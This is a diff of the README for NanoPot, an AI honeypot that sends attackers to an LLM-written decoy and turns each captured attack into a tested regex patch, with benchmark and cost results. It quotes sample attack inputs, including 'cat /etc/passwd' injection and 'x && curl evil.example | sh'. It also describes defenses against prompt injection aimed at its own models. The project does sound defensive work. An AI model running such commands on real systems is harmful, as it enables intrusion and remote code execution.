@@ -2,213 +2,250 @@
 
 **An Edge AI honeypot that converts attacks into tested security patches.**
 
-NanoPot runs on one HP ZGX Nano. Every request is checked by Jev and a model trained on the Nano; attackers are redirected to a decoy app whose answers Qwen writes live, and each attack is turned into a tested, independently verified patch that blocks the next attempt — instead of just blocking it and teaching the attacker nothing.
+HP Wolf Security research shows cheap, AI-built attacks are beating static defenses. NanoPot is for the security engineer who is done blocking, logging, and forgetting: a honeypot on one **HP ZGX Nano** that turns every attack into a tested patch.
 
-_Formerly codenamed Chameleon Edge: the Python package is still `chameleon/`._
+Every request is checked by **Jev** (TypeSafe's decision model) and by a model we **trained on the Nano**. New attacks are quietly redirected to a **decoy app** whose answers **Qwen3-Next-80B** writes live on the Nano, with fake credentials unique to each attacker. While the attacker is busy, the Nano writes a fix, tests it, has a **second AI (Gemma 4)** try to break it, stores it in **Redis**, and writes it into the app's code. The next attempt is blocked, and anyone who uses a stolen fake password is caught and traced.
 
-**Plain-language explainer with all diagrams:** [docs/NanoPot-Explained.pdf](docs/NanoPot-Explained.pdf)
+| Read | What it is |
+|---|---|
+| [docs/NanoPot-Explained.pdf](docs/NanoPot-Explained.pdf) | Plain-language explainer with every architecture diagram |
+| [docs/NanoPot-Metrics.pdf](docs/NanoPot-Metrics.pdf) · [docs/NanoPot-Charts.pdf](docs/NanoPot-Charts.pdf) | All measured results, as tables and as charts |
+| [docs/NanoPot-Demo-Script.pdf](docs/NanoPot-Demo-Script.pdf) | The 2-minute demo script |
+| [docs/benchmark-methodology.md](docs/benchmark-methodology.md) | Why each metric was chosen |
 
-**30-second demo:** _TODO — record before submission (see NEXT STEPS in HANDOFF.md)._
+_Formerly codenamed Chameleon Edge: the Python package is still `chameleon/`, and the repo is `EdgeA1`._
+
+## The problem
+
+AI made attacks cheap: anyone can prompt an LLM for a new attack variant in seconds, and [HP Wolf Security](#references) documents low-effort, AI-built attacks slipping past current defenses. Most defenses still **block, log, and forget**:
+
+- **Rules only know yesterday.** Static filters written for the old attack miss the new variant.
+- **A block is a free hint.** A 403 tells the attacker they were seen and what to change next.
+- **Nothing closes the gap.** The hole stays open until a human notices and writes a fix.
+- **Attack data is sensitive.** Payloads, techniques, and logs shouldn't have to leave the building.
+
+**Target user:** a security engineer or SOC analyst protecting a company application ("a cyber security professional" is one of HP's own example personas for this challenge).
+
+## How it works, in five steps
+
+1. **Check.** Every request is scored by Jev (asked first) and by our check model on the Nano; approved patches are checked too. Any signal flags it as an attack.
+2. **Trick.** A new attack gets a **307 redirect to the decoy app**, which looks and answers like the real one. The 80B model on the Nano writes believable fake data and plants **honeytokens** (fake passwords, keys, cards) unique to that attacker.
+3. **Learn.** In the background the 80B model writes a rule for that exact attack. It must pass **four deterministic tests**, then **Gemma 4** tries to break it; failures go back to the writer with the exact failing inputs, up to 5 tries.
+4. **Block.** The approved patch is stored in **Redis**, enforced at the front door on the very next request, and **rendered as Python into the app's own code**. A stolen honeytoken is blocked and traced to the session that received it.
+5. **Measure.** Every Nano AI call is also sent, unchanged, to **AWS Bedrock** running the same model, so edge and cloud cost, speed and tokens are compared on real traffic.
+
+The protected shop (login, search, files, support chat) is a **demo target**; the product is the security layer in front of it.
 
 ## Results at a glance
 
-All measured on one HP ZGX Nano (GB10) with public benchmark data; raw numbers in `results/`.
+All measured on one HP ZGX Nano (NVIDIA GB10) on Sep 25, 2026, with public benchmark and synthetic data. Raw numbers are in `results/`.
 
-- **The system learns an attack it has never seen, in about 3 minutes.** Path traversal is deliberately held out of the check model's training. First wave: **0%** caught. The honeypot captures it, the Nano writes a patch, deterministic tests and a second model check it, and the approved rule then blocks **78% of 280 unseen path-traversal payloads with 0 false positives across 6,434 benign requests** (`results/redteam_scenario.json`; the whole live run took 191 s).
-- **Normal users aren't touched:** 0 of 20 benign requests rerouted in the live run. SQL injection 10/10 and prompt injection 8/10 rerouted to the honeypot.
-- **Two models trained on the Nano.** The check classifier gets 0.994 F1 on seen attack types (`results/check_metrics.json`). A **Qwen2.5-7B LoRA patch writer** was distilled on the Nano from the 80B model. On attack types it never trained on, it wrote **2.7× more fully-passing rules than its base model (10% vs 3.75%)**, raised recall from 35% to 46% (teacher: 50%), and cut false positives from 3.4% to 0.0%. [Published on Hugging Face](https://huggingface.co/Yukta3030/chameleon-edge-patchwriter), limitations included.
-- **Everything fits on one box:** the 80B writer (54 GiB) and 12B verifier (34 GiB) serve side by side, using 101.5 of 121.6 GB. The writer does 36 tokens/s per stream and 169 tokens/s at 8 concurrent.
-- **Models make claims; tests check them.** Live testing found an auto-generated rule that could freeze the app (ReDoS), a URL-encoding bypass, and a verifier rejecting a very good patch on claims that didn't hold up. Each became a deterministic check (see "Attacks and defenses").
-
-## The problem, and who has it
-
-**Target user:** a security engineer / SOC analyst protecting a company application from attacks, including insiders — "a cyber security professional" is one of HP's own example personas for this challenge.
-
-- Blocking an attack teaches the defender nothing; the attacker just tries a variation.
-- Studying attackers safely needs isolation, and a long attacker conversation through cloud AI costs real money per token.
-- Writing and reviewing a fix for every new attack technique is slow, manual work.
-- Attack data — payloads, techniques, logs — is sensitive and shouldn't leave the building to a third-party cloud.
-
-**What it does:**
-1. A fast check layer decides whether each incoming request is malicious.
-2. Safe requests go straight to the protected application.
-3. Malicious requests are quietly rerouted to a honeypot AI on the Nano, which keeps the attacker engaged and logs everything they try.
-4. An AI on the Nano writes a security patch from the attack.
-5. A second AI, from a **different model family**, plus deterministic tests, independently verifies the patch.
-6. The approved patch feeds back into the check layer, so the same attack technique is caught immediately next time.
-
-The demo covers both a regular web API (SQLi, XSS, command injection, path traversal) and an AI chatbot endpoint (prompt injection, jailbreaks). **The protected application is only a demo target — the product is the security layer in front of it.**
-
-## Why edge, not cloud alone
-
-- **Containment:** attacker traffic never reaches the real app; it stays trapped on one physical box.
-- **Cost:** an attacker can chat with the honeypot for hours — zero marginal cost on the Nano, versus real per-token cost in the cloud.
-- **Privacy / data residency:** attack logs, payloads, and patches never have to leave the Nano.
-- **Works offline:** the Nano-side loop (honeypot, patching, verification) keeps running even if the cloud link drops; see "offline mode" below.
-
-HP's own research shows attackers increasingly use AI to generate new attack variations faster than defenses can adapt (see References). NanoPot Edge answers with AI on the defense side: trap the attacker, learn from the attempt, ship a verified patch automatically. (We build on this research; HP hasn't published on this exact problem.)
+- **It learns an attack type it has never seen.** Path traversal is held out of the check model's training on purpose. First wave: **0%** caught. After one learned patch: **78% of 280 unseen payloads blocked, with 0 false positives on 6,434 normal requests**; the whole live run took 191 s (`results/redteam_scenario.json`).
+- **Jev + Nano beat either alone.** In a live run of 13 real requests through the gateway, all 13 were routed correctly, and **Jev caught 5 attacks the Nano model scored as safe** (2 command injection, 2 path traversal, 1 SSRF). Jev answers in about 260–650 ms.
+- **Nano vs AWS Bedrock, same model, same prompts:** the Nano is **~38–59× cheaper per request** (electricity only), AWS is slightly faster per request (7% at p50 in the latest run), and **AWS CloudWatch's own invocation and token counts matched ours call for call**. Buying a Nano pays off above roughly **6k–15k attacks/day**; one Nano handles about **107k requests/day**.
+- **Patches land in about 40 s to 3 minutes** and generalize: a rule learned from `shoes; cat /etc/passwd` also blocked `bag; ls -la /home` and `x && curl evil.example | sh`, while `Tom & Jerry DVD; season 1` still reached the real app.
+- **Two models trained on the Nano.** The check classifier scores **0.994 F1** (precision 99.85%, false-positive rate 0.09%) on 10,632 test requests. A **Qwen2.5-7B LoRA patch writer**, distilled from the 80B on the Nano, wrote **2.7× more fully passing rules than its base model** (10% vs 3.75%) on attack types it never saw, and cut false positives from 3.4% to 0% ([Hugging Face](https://huggingface.co/Yukta3030/chameleon-edge-patchwriter)).
+- **Everything fits on one box:** the 80B writer (54.3 GB, NVFP4) and the 12B verifier (34.3 GB, BF16) serve side by side, 101.5 of 121.6 GB in use. The writer produces 36 tokens/s per stream and 169 tokens/s at 8 concurrent.
 
 ## Architecture
 
 ```mermaid
 flowchart TD
-    R[Incoming request] --> GW[Gateway :8000]
-    GW --> J{Jev<br/>TypeSafe, cloud, asked first}
-    GW --> N{Nano check model<br/>trained on Nano}
-    J --> D{Decision fusion<br/>+ approved patches from Redis}
-    N --> D
-    D -->|Safe| A[Demo apps :8200<br/>login · search · files · chat]
-    D -->|Stolen honeytoken or patched attack| X[403]
-    D -->|Malicious| DC[307 redirect to the decoy app :8300<br/>on the Nano]
-    DC --> H[Honeypot AI<br/>Qwen3-Next-80B-A3B NVFP4]
-    H --> L[(Attack log)]
-    L --> W[Patch writer<br/>80B, or the fine-tuned 7B]
-    W --> T[Deterministic tests<br/>replay · URL-encoding · normal traffic · ReDoS]
-    T -->|Fail, with the exact inputs| W
-    T --> V{Verifier AI<br/>Gemma 4 12B, different family}
-    V --> C[Test the verifier's<br/>example inputs]
-    C -->|Confirmed issue| W
-    C -->|No confirmed issue| S[(Redis patch store)]
-    S --> D
-    S -->|rendered as Python| A
+    R[Customer or attacker] --> GW[Gateway :8000]
+    GW --> RT{Router + fusion<br/>malicious if any check flags it}
+    J[Jev · TypeSafe<br/>via Vercel AI Gateway] -->|1 asked first| RT
+    N[Nano check model :8010<br/>TF-IDF + LogReg] -->|2| RT
+    RS[(Redis<br/>active patches)] -->|3| RT
+    RT -->|safe · proxied| A[Demo apps :8200<br/>login · search · files · chat<br/>with Python code patches]
+    RT -->|stolen honeytoken or patched attack| X[403]
+    RT -->|new attack · 307| DC[Decoy app :8300<br/>fake shop, same API]
+    DC --> Q[Qwen3-Next-80B NVFP4<br/>ZRT / vLLM :8080]
+    Q --> L[(SQLite: sessions,<br/>attack log, honeytokens)]
+    Q -.->|same prompt, Metrics on| B[AWS Bedrock<br/>same Qwen3-Next-80B]
+    DC --> PJ[Patch job]
+    PJ --> W[Qwen3-Next-80B writes a regex rule]
+    W --> T[4 tests: replay · URL-encoding ·<br/>normal traffic + hard cases · ReDoS]
+    T -->|fail, with the exact inputs| W
+    T --> V[Gemma 4 12B tries to break it<br/>claims are re-tested]
+    V -->|confirmed issue| W
+    V --> RS
+    RS -->|rendered as Python| A
 ```
 
-**Request path** (`chameleon/gateway/app.py`, `chameleon/router.py`, `chameleon/fusion.py`): clients use the gateway. Each request goes to Jev first (`chameleon/jev/client.py`: one call asks whether any input is an attack and what kind), then to the Nano check model and the approved patches. It's malicious if any of them flags it; if Jev is missing or slower than `JEV_TIMEOUT_S` (2 s), the Nano decides alone. Safe requests are proxied to the demo apps. Attacks get a **307 redirect to the decoy app** (`chameleon/decoy/app.py`, port 8300): a fake copy of the shop, on the Nano, whose every answer is written live by Qwen with honeytokens unique to that attacker. Using a stolen honeytoken, or repeating an attack an approved patch covers, gets a 403.
+**Request path** (`chameleon/gateway/app.py`, `chameleon/router.py`, `chameleon/fusion.py`). Clients use the gateway on `:8000`. The router first checks every input against the honeytokens handed out so far (`honeypot/deception.py`), then asks **Jev** (`chameleon/jev/client.py`: one call to `typesafe-ai/jev` through Vercel AI Gateway asks "is this an attack?" and "what kind?"), then the **Nano check model**, then every **approved patch**. A request is malicious if any of them flags it. If Jev has no key, errors, or takes longer than `JEV_TIMEOUT_S` (2.5 s, one retry on a 5xx), the Nano decides alone, which is also how NanoPot runs with no internet. Safe requests are proxied to the demo apps; attacks get a 307 to the decoy with a new session id; stolen honeytokens and already-patched attacks get a 403. Jev's and the Nano's scores are logged for every request.
 
-**Patches** (`chameleon/patch/`): every honeypot hit starts a background patch job. Approved patches are stored in **Redis** (`redis_store.py`: the rule, its Python code, the attack it came from, and the full test trail), the front door enforces them at once, and `integrate.py` renders each one into the matching demo app as Python between the `AUTO-PATCHES` markers (`chameleon/apps/{login,search,files,chat}_app.py`). The demo app runs with `--reload`, so the code patch is live within seconds. Only verified rules are rendered, through a fixed template: every value enters the code through a Python string literal, and the file must compile before it replaces the old one.
+**Decoy** (`chameleon/decoy/app.py`, port 8300). Same four endpoints and JSON shapes as the real shop (it presents itself as "ShopLegacy"), but every answer is written live by Qwen from a persona prompt (`honeypot/persona.py`) seeded with that session's honeytokens. A cookie keeps a returning attacker in the same session, so the fake data stays consistent.
 
-**How the check layer / router works** (`chameleon/fusion.py`, `chameleon/router.py`): every request's untrusted fields go to (a) our own classifier trained and served on the Nano, (b) Jev — TypeSafe AI's cloud decision model, when available — and (c) every currently-approved patch rule. A request is malicious if *any* signal fires. If Jev is unreachable, the system falls back to the Nano model and rules alone — this is also how "offline mode" works: set `CLOUD_ENABLED=false` and nothing changes except Jev drops out of the vote. Both scores are logged for every request (`requests` table), because the disagreement cases are the interesting evidence.
+**Patches** (`chameleon/autopatch.py`, `chameleon/patch/`). Each honeypot hit queues a patch job, and a single worker runs them one at a time: writer → tests → verifier (`patch/pipeline.py`). Approved patches go to the **Redis patch store** (`patch/redis_store.py`: the rule, its rendered Python, the attack it learned from, the target file and every test result), and the front door enforces Redis's active set immediately, falling back to SQLite if Redis is down. `patch/integrate.py` then renders each approved rule into the matching app (`chameleon/apps/{login,search,files,chat}_app.py`) between `AUTO-PATCHES` markers; the demo app runs with `--reload`, so the code patch is live within seconds. The model only chooses the regex: the code comes from a fixed template, every value enters it as a Python string literal, and the file must compile before it replaces the old one.
 
-**Orchestrator** (`chameleon/orchestrator/`): decides where each AI job (honeypot turn, write patch, verify patch) actually runs. Default is always the Nano; if a job's Nano model isn't routable (checked against the ZRT proxy's `/v1/models`, since `zrt services` was observed reporting "Ready" while the proxy still returned 404), it falls back to a configured cloud model (Anthropic, chosen specifically to avoid AWS — see "Attacks and defenses" below) and logs the placement, latency, tokens, and real cost. Policy lives in `config/routing.yaml`, not code.
+**Metrics mirror** (`chameleon/cloud_mirror.py`). With METRICS_WITH_AWS on, every Qwen call on the Nano is also sent, with the identical prompt, to AWS Bedrock (`qwen.qwen3-next-80b-a3b`, us-west-2) in a background thread, so it never slows the live request. Each pair records tokens, latency, cost, and the Nano's GPU energy (`nvidia-smi`, sampled every second). The switch is shared by every service through `data/metrics_mode`.
+
+## Nano vs AWS Bedrock
+
+Latest run, 23 paired requests (decoy replies and patch writing), Qwen3-Next-80B on both sides:
+
+| | HP ZGX Nano | AWS Bedrock |
+|---|---|---|
+| Latency p50 / p95 | 3,317 / 6,262 ms | 3,102 / 5,085 ms |
+| Tokens per request (in → out) | 782 → 136 | 782 → 127 (identical input) |
+| Cost per request | **$0.0000070** (measured energy × $0.2575/kWh) | $0.00027 on-demand · $0.00022 enterprise* |
+| Energy per request | 98.5 J at 27.4 W average GPU draw | not visible |
+| Attack data leaving the site | none | every prompt |
+
+\* Enterprise = on-demand minus an assumed 20% negotiated discount; AWS publishes no provisioned price for this model.
+
+An earlier run of 18 mostly long patch-writing prompts measured the Nano **59× cheaper** and AWS **2.2× faster**, with break-even at ~5.8k attacks/day. Shorter prompts make each AWS call cheaper, so the Nano needs more traffic to pay off; across both runs, **38–59× cheaper per request** and break-even at **~6k–15k attacks/day**. The monthly-cost projection spreads a $3,999 box over 36 months plus measured electricity.
+
+**Independent check:** CloudWatch's own `Invocations`, `InputTokenCount` and `OutputTokenCount` for the model matched our log minute by minute. A presentation layout for that CloudWatch dashboard is in [docs/cloudwatch-dashboard.json](docs/cloudwatch-dashboard.json) (paste it in via *Actions → View/edit source*).
 
 ## Attacks and defenses
 
 | Layer | Defense |
-| --- | --- |
-| Isolation | Every model server is bound to `127.0.0.1`; only a keyed gateway is meant to be reachable beyond localhost (see Limitations — gateway not yet built) |
-| Honeypot | Only fake data, fake credentials, fake files — never anything real |
-| Canary tokens | Unique fake secrets planted in the honeypot and the demo app (`chameleon/demoapp/main.py`); if one shows up anywhere else, that's a detected leak. A canary tripping in the *real* demo app is also how an attack the check layer missed gets caught and routed into the patch loop |
-| Prompt injection | Attacker text is always marked "untrusted data, not instructions" in every prompt sent to any model (honeypot, writer, verifier) |
-| Patch safety | Nothing is ever auto-applied. A patch only reaches `approved` after four deterministic tests pass: **replay** (blocks every captured payload), **URL-encoding** (also blocks their encoded forms), **normal traffic** (blocks no real user input), and **ReDoS**. Then an independent verifier from a different model family reviews it. Every attempt is versioned and can be rolled back |
-| ReDoS | Model-written regexes run on every live request, so a slow one would let the security layer itself be used for denial of service. Live testing caught the real writer producing patterns that took 3.3 s on an 8 KB input. Rules run on the `regex` engine with a **50 ms per-match cap that fails closed** (reroute, never wave through), and every candidate must finish 2 KB adversarial inputs inside that budget before approval |
-| Encoding bypass | Found by the verifier on a live rule: a raw-regex patch let `%2e%2e%2f` walk past it. Now a deterministic test: every captured payload's URL-encoded form must also be blocked, which forces `normalize_then_deny` (decode repeatedly, then match) |
-| Accountable verifier | The verifier must back every objection with **literal example inputs**, and the pipeline runs them against the rule. Claims that don't hold up are discarded. Measured live: before this change it rejected a rule with 85% recall on 280 unseen payloads and 0/6,434 false positives, citing 3 bypasses of which 2 were actually blocked |
-| Verifier isolation | The verifier sees only the proposed rule, a sample of the attack (both marked untrusted), and our own test measurements — never the writer's reasoning or the raw attacker conversation, so an attacker can't hide an "approve this" instruction where the verifier would read it |
-| Cloud minimization | Jev gets only what it needs to classify a request. Attack logs, patches, and analysis never leave the Nano |
-| AWS sensitivity | The cloud fallback provider is Anthropic, not AWS Bedrock, since AWS people are judges for this event |
+|---|---|
+| Isolation | Every service binds to `127.0.0.1`; the gateway is the only front door, and nothing is exposed to the public internet |
+| Deception | The decoy serves only fake data. Each session gets unique honeytokens (`honeypot/deception.py`), so a stolen one identifies exactly which attacker took it |
+| Canary tokens | The demo apps hold fake canary secrets (`apps/files_app.py`, `apps/login_app.py`). If one appears in a response, an attack the checks missed reached the real app |
+| Prompt injection | Attacker text is always marked "untrusted data, not instructions" in every prompt, to Jev, the decoy, the writer, and the verifier |
+| Patch safety | A patch is applied only after all four deterministic tests pass: **replay** (blocks every captured payload), **URL-encoding** (blocks their encoded forms too), **normal traffic** (blocks no real user input, including a fixed list of realistic inputs that use attack characters, `autopatch.HARD_NEGATIVES`) and **ReDoS**. Then an independent verifier reviews it. Every attempt is versioned and can be rolled back |
+| ReDoS | Model-written regexes run on every request. Rules run on the `regex` engine with a **50 ms per-match cap that fails closed**, and every candidate must finish 2 KB adversarial inputs inside that budget before approval |
+| Accountable verifier | The verifier must back every objection with literal example inputs, and the pipeline runs them. Claims that don't hold up are discarded; confirmed bypasses go back to the writer |
+| Verifier isolation | The verifier sees only the proposed rule, a sample of the attack (both marked untrusted) and our test measurements, never the writer's reasoning or the attacker's conversation |
+| Code-patch safety | Rendered from a fixed template with string literals only, compile-checked, atomic file replace; the model never writes code |
+| Fallbacks | Jev down or slow → the Nano decides; Redis down → SQLite; a bad pattern → fails closed. Each is covered by unit tests |
 
 ## Training pipeline on the Nano
 
-The **check model** (`chameleon/check/`) is a TF-IDF + logistic-regression classifier trained from scratch on the Nano (`make train-check`, ~3 seconds, see `results/check_metrics.json`) — this satisfies the organizer requirement that a model we trained is hosted on the Nano, and doubles as the fallback/second-opinion check when Jev is down.
+The **check model** (`chameleon/check/`) is a TF-IDF + logistic-regression classifier trained from scratch on the Nano (`make train-check`, 3.2 s on 22,098 rows) from [HttpParamsDataset](https://github.com/Morzeux/HttpParamsDataset), [deepset/prompt-injections](https://huggingface.co/datasets/deepset/prompt-injections) and [jackhhao/jailbreak-classification](https://huggingface.co/datasets/jackhhao/jailbreak-classification). Path traversal is deliberately excluded (`HELDOUT_ATTACK_TYPES` in `check/dataset.py`), so recall on it is **0%**: a real blind spot that the learning loop closes live (`python -m chameleon.redteam.scenario`, or LAUNCH_ATTACK_WAVE on the dashboard).
 
-A held-out attack type (path traversal) is deliberately excluded from training (`chameleon/check/dataset.py`, `HELDOUT_ATTACK_TYPES`). Measured recall on it: **0%** — the classifier genuinely cannot catch an attack family it's never seen. That's not a bug we hid; it's the evidence for why the honeypot/patch loop exists at all. The red-team scenario (`python -m chameleon.redteam.scenario`) demonstrates the system closing that exact gap live: 0% on the first wave → patch written, tested, verified → 78% of 280 unseen payloads blocked, because the approved rule feeds back into the check layer.
+| Test set | Requests | Precision | Recall | False-positive rate |
+|---|---|---|---|---|
+| All test data | 10,632 | 99.85% | 98.96% | 0.09% |
+| HttpParams (web attacks) | 10,258 | 99.97% | 99.5% | 0.02% |
+| jackhhao (jailbreaks) | 258 | 96.4% | 97.8% | 4.1% |
+| deepset (prompt injection) | 116 | 100% | 66.7% | 0% |
 
 ### Fine-tuned patch writer (`training/`)
 
 A **LoRA fine-tune of Qwen2.5-7B-Instruct**, distilled from the 80B writer entirely on the Nano:
 
-1. **Verified data** (`generate_data.py`): the 80B teacher wrote 500 rules for SQLi, XSS, prompt injection, and jailbreak samples. A rule was kept only if it passed the same deterministic tests as production, plus ≤1% false positives on 300 benign requests it never saw: **230 kept**. The labels are verified by tests, not by a model's opinion.
-2. **Training** (`train_lora.py`): r=16 on all attention and MLP projections, bf16, 2 epochs. **17.7 min on the GB10, 20.4 GiB peak.** Validation loss 0.678 → 0.642.
-3. **Evaluation** (`eval_patchwriter.py`): on **command injection and path traversal, both excluded from training**. 80 tasks, the exact production prompt, greedy decoding. Every rule is scored by the deterministic tests:
+1. **Verified data** (`generate_data.py`): the 80B teacher wrote 500 rules; a rule was kept only if it passed the production tests plus ≤1% false positives on 300 unseen benign requests: **230 kept**.
+2. **Training** (`train_lora.py`): r=16 on all attention and MLP projections, bf16, 2 epochs, **17.7 min on the GB10, 20.4 GB peak**. Validation loss 0.678 → 0.642.
+3. **Evaluation** (`eval_patchwriter.py`): 80 tasks on **command injection and path traversal, both excluded from training**, scored by the deterministic tests.
 
 | | Base Qwen2.5-7B | **Fine-tuned 7B** | 80B teacher |
 |---|---|---|---|
 | Rule fully passes | 3.75% | **10.0%** | 13.75% |
-| Recall on unseen payloads | 35% | **46%** | 50% |
+| Recall on unseen payloads | 34.8% | **46.5%** | 50.2% |
 | False-positive rate | 3.4% | **0.0%** | 0.01% |
 | Valid output | 90% | **65%** | 85% |
 
-The fine-tune closes most of the gap to a model ~10× its size, and it beats the teacher on command injection (12.5% vs 7.5% full pass). Its real weakness is that it falls into repetition loops on about a third of outputs. In production the pipeline retries on invalid output, so that costs attempts, not safety. [Adapter + model card on Hugging Face.](https://huggingface.co/Yukta3030/chameleon-edge-patchwriter)
+The fine-tune closes most of the gap to a model ~10× its size; its weakness is repetition loops on about a third of outputs, which the pipeline's retries absorb. [Adapter and model card on Hugging Face.](https://huggingface.co/Yukta3030/chameleon-edge-patchwriter)
 
 ## Benchmarks
 
-See `docs/benchmark-methodology.md` for why each metric was chosen. Everything below was measured on the Nano with both LLMs and the check model serving.
+Measured on the Nano with both LLMs and the check model serving (`results/llm_baseline.csv`, `results/system_memory.json`):
 
 | Model | 1 stream | 4 concurrent | 8 concurrent | Memory |
 |---|---|---|---|---|
-| Writer: Qwen3-Next-80B-A3B, NVFP4 | 36 tok/s, p95 0.71 s | 109 tok/s | 169 tok/s, p95 1.33 s | 54.3 GiB |
-| Verifier: Gemma 4 12B, bf16 | 7.5 tok/s, p95 3.96 s | 34 tok/s | 62 tok/s, p95 3.45 s | 34.3 GiB |
-| Check model (TF-IDF + LogReg) | 0.36 ms median / 0.56 ms p95 per request | | | CPU, tiny |
+| Writer: Qwen3-Next-80B-A3B, **NVFP4** | 36 tok/s, p50 0.71 s | 109 tok/s | 169 tok/s, p50 1.16 s | 54.3 GB |
+| Verifier: Gemma 4 12B, **BF16** | 7.5 tok/s, p50 3.45 s | 34 tok/s | 62 tok/s, p50 3.01 s | 34.3 GB |
+| Check model | ~1 ms per request | | | CPU |
 
-**The 80B model is ~5× faster per stream than the 12B one.** Decoding on the GB10 is memory-bandwidth bound. The MoE reads only ~3B active parameters at 4 bits per token, while the dense 12B reads all ~24 GB of its bf16 weights per token, which caps it near 10 tok/s. The obvious next speedup is quantizing the verifier. Whole box: 101.5 / 121.6 GB used with everything running.
+The 80B model is ~5× faster per stream than the 12B one: decoding on the GB10 is memory-bandwidth bound, and the MoE reads only ~3B active parameters at 4 bits per token, while the dense 12B reads all its BF16 weights. The obvious next step is an NVFP4 verifier (for example `RedHatAI/gemma-4-12B-it-NVFP4`, ~10 GB, or `nvidia/Gemma-4-26B-A4B-NVFP4`); it isn't switched yet.
 
-Raw files: `results/check_metrics.json`, `llm_baseline.csv`, `system_memory.json`, `redteam_scenario.json`, `finetune_*.json`.
+## The dashboard
+
+`http://127.0.0.1:8100` (from a laptop: `ssh -N -L 8100:localhost:8100 -L 8000:localhost:8000 -L 8300:localhost:8300 hp4@<tailscale-ip>`).
+
+- **HOME**
+  - **PAYLOAD_INJECTOR**: a terminal with attack presets (Auth_Bypass, DB_Dump, XSS_Infect, Prompt_Inject, Path_Traversal, Use_Stolen_Creds, normal traffic). Each request shows Jev's and the Nano's scores, the routing decision, and what the attacker received.
+  - **HACKER'S_POV**: the shop as the attacker sees it, including decoy replies (database-style tables are drawn as real tables), with an operator-only strip below.
+  - **ACTIVE_DEFENSE_RULES**: the AUTO_PATCH_ENGINE (LEARNING / MITIGATED, with a small fight between the attacker and NanoPot that ends in a K.O. when the patch is approved), the base check model, and every approved patch. Click a patch to see its Python code and full test trail.
+  - **LAUNCH_ATTACK_WAVE** (the 0% → 78% run), **RESET** (clears sessions, logs, live patches; the patch history stays in Redis), **REDIS CLEAR** (deletes NanoPot's Redis data and retires live patches).
+- **METRICS**: Nano vs AWS side by side (requests, latency, tokens, cost, energy), the cost-at-scale chart, and every paired request.
 
 ## Quick start
 
 ```bash
 python3 -m venv .venv && source .venv/bin/activate
-cp .env.example .env          # fill in HF_TOKEN, JEV_API_KEY, ANTHROPIC_API_KEY as needed
-make setup                    # install Python packages
-make data                     # download the check-model datasets
-make train-check              # train + serve-ready the Nano check model
-make test                     # unit tests
+cp .env.example .env          # HF_TOKEN; AWS keys for the Bedrock comparison
+echo 'AI_GATEWAY_API_KEY=…' > .env.local   # Vercel AI Gateway key, used for Jev (git-ignored)
+make setup && make data && make train-check && make test   # 110 tests
 
-make serve-redis              # Redis patch store on :6379 (see scripts/serve_redis.sh to build it)
-make serve-check              # check model API on :8010
+make serve-redis              # Redis patch store on :6379 (scripts/serve_redis.sh; built from source, password in .env)
+make serve-check              # check model on :8010
 make serve-demo               # the four demo apps on :8200 (reloads when a code patch lands)
-make serve-decoy              # decoy app on :8300 (where attackers are redirected)
+make serve-decoy              # decoy app on :8300
 make serve-gateway            # front door on :8000
-make serve-dashboard          # backend API + live dashboard on :8100
+make serve-dashboard          # dashboard + API on :8100
 ```
+
+After changing backend code, restart the dashboard, gateway **and** decoy: patch jobs run inside whichever service received the attack, and decoy replies are generated in the decoy process.
+
+`scripts/show_patches.sh` prints the patches in Redis (`all` for recent attempts, `watch` to see them arrive live). `index.ts` is a Vercel AI SDK smoke test for the gateway key (`npm run example`, Node 22).
 
 ## ZGX Nano setup (zrt / model serving)
 
 ```bash
-uname -m; nvidia-smi; zrt status; zrt models     # sanity check
-zrt pull hf:nvidia/Qwen3-Next-80B-A3B-Instruct-NVFP4   # honeypot + patch writer, ~51 GB
+uname -m; nvidia-smi; zrt status; zrt models           # sanity check
+zrt pull hf:nvidia/Qwen3-Next-80B-A3B-Instruct-NVFP4   # decoy + patch writer, ~51 GB
 zrt pull hf:google/gemma-4-12B-it                       # patch verifier, ~24 GB
-
-# Serves both behind ONE shared proxy on :8080, routed by model name (not one
-# port per model -- see HANDOFF.md 5.4), writer first, then verifier.
-scripts/serve_models.sh
+scripts/serve_models.sh   # both behind one proxy on :8080, routed by model name
 ```
 
-Every flag in `scripts/serve_models.sh` fixed a real failure we hit on the Nano (full detail in `HANDOFF.md` sections 5.4 and 6.4):
-- **Context length:** `zrt serve` doesn't bound it by default. The 80B model defaulted to `max_model_len=262144` and silently OOM'd mid-startup, so we pass `--extra '--max-model-len=8192'`.
-- **Kernel compilation:** on first run FlashInfer JIT-compiles CUDA kernels with ~20 parallel `nvcc` jobs, and one got OOM-killed next to the loaded model. `MAX_JOBS=4` fixes it. The first writer start takes ~15–20 min; the kernels are cached after that.
-- **Memory split:** auto-sizing gave the writer 79 GB, leaving the verifier too little host RAM (CPU and GPU share the same 121 GB). We now set writer 0.45 and verifier 0.25 explicitly.
-- **Proxy race:** right after a `zrt stop`, a fresh `zrt serve` can be deregistered by the proxy 2–3 seconds later even though the backend underneath is fine. The script refuses to start unless `zrt services` is empty.
-
-To view the dashboard from a laptop: `ssh -L 8100:127.0.0.1:8100 hpX@<tailscale-ip>`, then open `http://127.0.0.1:8100`.
+Every flag in `scripts/serve_models.sh` fixed a real failure on the Nano (details in `HANDOFF.md` 5.4 and 6.4): `--max-model-len=8192` (the 80B defaulted to 262k context and OOM'd), `MAX_JOBS=4` (FlashInfer's first-run kernel build got OOM-killed), explicit memory fractions 0.45 / 0.25 (auto-sizing starved the verifier), and refusing to start while `zrt services` isn't empty (a proxy race deregistered fresh backends).
 
 ## API
 
-- **Check model** (`:8010`) — `GET /health`, `POST /check {"inputs": [str, ...]}` → `{"malicious": bool, "score": float, "worst_input_index": int, "latency_ms": float}`.
-- **Demo app** (`:8200`) — `GET /search?q=`, `POST /login`, `GET /files?name=`, `POST /chat`. Every endpoint enforces currently-approved patch rules before responding.
-- **Dashboard/backend** (`:8100`) — `GET /` (the dashboard), `GET /api/summary|requests|sessions|patches|llm_calls`, `POST /api/try {"target": "login"|"search"|"files"|"chat", "inputs": {...}}` (one request through the real front door: safe → forwarded to the app, malicious → the honeypot's reply), `POST /api/scenario/start` + `GET /api/scenario/status` (the attack wave runs as a background job with live phase progress; a single ~3-minute request broke in the browser and wouldn't survive SSH/VS Code tunnels), `POST /api/demo/reset`, `WS /ws` (live summary, once a second).
+- **Gateway** (`:8000`): `POST /login`, `GET /search?q=`, `GET /files?name=`, `POST /chat`. Safe → proxied to the app; attack → 307 to the decoy; stolen honeytoken or patched attack → 403.
